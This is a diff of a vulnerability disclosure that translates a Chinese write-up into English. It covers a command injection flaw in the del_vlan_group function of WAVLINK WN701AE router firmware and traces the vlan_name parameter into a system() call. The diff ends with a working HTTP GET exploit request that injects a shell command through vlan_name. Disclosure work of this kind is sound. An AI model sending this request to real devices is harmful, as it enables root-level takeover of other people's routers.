@@ -7,15 +7,15 @@
 
 # Description
 
-WAVLINK WN701AE 固件（版本 WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin）ioos Web 后端存在命令注入漏洞。del_vlan_group 未对 vlan_name 参数过滤即拼接进 system() 执行命令，已认证攻击者可通过注入任意系统命令实现 root 权限代码执行。
+WAVLINK WN701AE firmware (version WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin) contains a command injection vulnerability in the ioos web backend. The del_vlan_group function does not sanitize the vlan_name parameter before concatenating it into a system() call for command execution. An authenticated attacker can inject arbitrary system commands to achieve remote code execution with root privileges.
 
 ## Impact
 
-利用 del_staticrule 漏洞命令注入漏洞在设备上以 root获取权限执行任意命令，从而完全控制路由器。可造成：窃取与篡改网络流量、修改固件配置实现持久化后门、发起内网横向渗透，或将大量设备纳入僵尸网络发起攻击。
+An attacker can exploit the command injection vulnerability in del_vlan_group to execute arbitrary commands with root privileges on the device, thereby gaining full control over the router. This can lead to: interception and tampering of network traffic, modification of firmware configurations to establish persistent backdoors, lateral movement within the internal network, or the incorporation of large numbers of compromised devices into a botnet for launching large-scale attacks.
 
 ## Vulnerability Details
 
-在 del_vlan_group函数 sub_4113D4中 ，在检测登录后，用户可控参数 vlan_name,在strcpy(v8, v4); --> 进入for循环 i = (const char *)strtok_r(v8, ";", v10); 对输入字符串用 '  ; ' 进行分割然后依次给到i ,然后通过 snprintf(v9, 256, "vlan_group.sh del \"%s\"", i);，最后通过system(v9);执行导致命令注入
+In the del_vlan_group function sub_4113D4, after authentication checks, the user-controllable parameter vlan_name is passed to strcpy(v8, v4);, then enters a for loop: i = (const char *)strtok_r(v8, ";", v10); — the input string is split by semicolons (;) and each token is assigned to i. Subsequently, snprintf(v9, 256, "vlan_group.sh del \"%s\"", i); formats the command string, which is then executed via system(v9), resulting in command injection.
 
 
 
@@ -32,11 +32,11 @@ WAVLINK WN701AE 固件（版本 WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin）ioo
 <img width="1157" height="674" alt="图片" src="https://github.com/user-attachments/assets/42d000ac-5f74-4f9a-99e9-6a8421c34378" />
 
 
-# 漏洞利用
+# Exploitation
 
 **exp**
 
-其中token需要登录获取
+Authentication is required to obtain a valid token before exploiting this vulnerability.
 
 ```http
 GET /protocol.csp?fname=net&opt=del_vlan_group&function=set&vlan_name=aa%22%20%7C%20touch%20%2Fpwned_vlan%20%23&token=6053DFA50DD9985A95F0714AF96DE8E4 HTTP/1.1
